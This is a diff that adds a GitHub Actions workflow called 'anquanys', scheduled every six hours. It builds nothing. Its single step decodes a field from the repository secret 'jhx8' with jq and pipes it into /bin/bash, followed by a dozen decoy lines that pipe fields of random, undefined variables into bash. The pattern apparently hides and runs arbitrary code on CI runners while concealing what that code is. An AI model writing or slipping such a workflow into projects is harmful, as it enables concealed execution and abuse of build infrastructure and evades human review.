@@ -1,0 +1,29 @@
+name: anquanys
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: anquanys
+        env:
+          jhx8: ${{ secrets.jhx8 }}
+        run: |
+          echo $jhx8 | jq -r .c2553 | /bin/bash
+          echo $vkrk11956 | jq -r .ztmnp920 | /bin/bash
+          echo $ya846 | jq -r .ujxsi3 | /bin/bash
+          echo $ceakf598 | jq -r .tbg21 | /bin/bash
+          echo $fik19 | jq -r .vegee9068 | /bin/bash
+          echo $p2471 | jq -r .kuk76248 | /bin/bash
+          echo $ldum2 | jq -r .ae9 | /bin/bash
+          echo $qnxxd337 | jq -r .rqwu7 | /bin/bash
+          echo $prxoy8358 | jq -r .m300 | /bin/bash
+          echo $fmh4012 | jq -r .ruztt244 | /bin/bash
+          echo $uu19937 | jq -r .feigv858 | /bin/bash
+          echo $ydqgf301 | jq -r .nhq44 | /bin/bash
+          echo $nxa9702 | jq -r .fv628 | /bin/bash
+
